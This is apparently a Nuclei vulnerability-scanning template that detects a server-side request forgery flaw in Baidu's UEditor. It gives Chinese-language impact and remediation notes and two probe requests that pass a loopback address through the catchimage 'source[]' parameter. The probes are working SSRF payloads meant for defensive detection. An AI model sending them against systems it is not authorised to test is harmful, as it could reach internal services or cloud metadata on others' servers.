id: ueditor-ssrf

info:
  name: UEditor - 服务端请求伪造
  author: pwnhxl
  severity: medium
  description: |
    该模板用于检测 UEditor - 服务端请求伪造。该类漏洞通常源于服务端按用户提供的地址发起请求，但缺少目标地址校验和内网访问限制。模板会向 `/ueditor/php/controller.php?action=catchimage&source[]=http://127.0.0.1:{{rand_text_numeric(6...`、`/ueditor/jsp/controller.jsp?action=catchimage&source[]=http://127.0.0.1:{{rand_text_numeric(6...` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可借助目标服务器访问内网管理接口、云元数据地址或其他受信任网络资源。
    - 在可回显或可外带的场景下，SSRF 可能导致敏感信息泄露、凭据获取或进一步攻击内部系统。
  remediation: |
    - 对服务端请求目标使用严格白名单，禁止访问内网网段、回环地址、链路本地地址和云元数据地址。
    - 校验跳转后的最终地址，限制协议类型，并为出站请求配置最小化网络权限。
    - 监控异常内网访问和外联请求，轮换可能通过元数据接口泄露的凭据。
  reference:
    - https://xz.aliyun.com/t/4154
    - https://www.seebug.org/vuldb/ssvid-97311
  classification:
    cpe: cpe:2.3:a:baidu:ueditor:*:*:*:*:*:*:*:*
    cwe-id: CWE-99,CWE-918
  metadata:
    verified: true
    max-request: 2
    vendor: baidu
    product: ueditor
    shodan-query: html:"UEditor"
  tags: ueditor,ssrf,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/ueditor/php/controller.php?action=catchimage&source[]=http://127.0.0.1:{{rand_text_numeric(6)}}/?1.png"
      - "{{BaseURL}}/ueditor/jsp/controller.jsp?action=catchimage&source[]=http://127.0.0.1:{{rand_text_numeric(6)}}/?1.png"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '\u94fe\u63a5\u4e0d\u53ef\u7528'
          - '"original":'
          - '"SUCCESS"'
        condition: and

      - type: status
        status:
          - 200
